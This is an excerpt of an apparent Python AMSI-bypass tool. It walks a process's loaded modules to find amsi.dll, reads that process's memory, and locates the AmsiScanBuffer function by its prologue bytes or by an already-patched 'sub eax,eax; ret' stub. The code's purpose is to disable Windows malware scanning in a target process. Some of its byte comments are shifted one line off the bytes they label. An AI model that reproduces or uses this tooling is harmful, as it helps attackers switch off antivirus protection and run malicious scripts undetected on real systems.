...
def readBuffer(handle, baseAddress, AmsiScanBuffer):
    ...
    while True:
        ...
        KERNEL32.ReadProcessMemory(
            handle, baseAddress, lpBuffer, len(lpBuffer), nBytes
        )
        if lpBuffer.value == AmsiScanBuffer or lpBuffer.value.startswith(
            b"\x29\xc0\xc3"
        ):
            return baseAddress
        else:
...
def getAmsiScanBufferAddress(handle, baseAddress):
    AmsiScanBuffer = (
        b"\x4c\x8b\xdc"
        + b"\x49\x89\x5b\x08"  # mov r11,rsp
        + b"\x49\x89\x6b\x10"  # mov qword ptr [r11+8],rbx
        + b"\x49\x89\x73\x18"  # mov qword ptr [r11+10h],rbp
        + b"\x57"  # mov qword ptr [r11+18h],rsi
        + b"\x41\x56"  # push rdi
        + b"\x41\x57"  # push r14
        + b"\x48\x83\xec\x70"  # push r15  # sub rsp,70h
    )
...
def getAmsiDllBaseAddress(handle, pid):
    ...
    while ret:
        if me32.szModule == b"amsi.dll":
            print(
                f"[+] Found base address of {me32.szModule.decode()}: {hex(me32.modBaseAddr)}"
            )
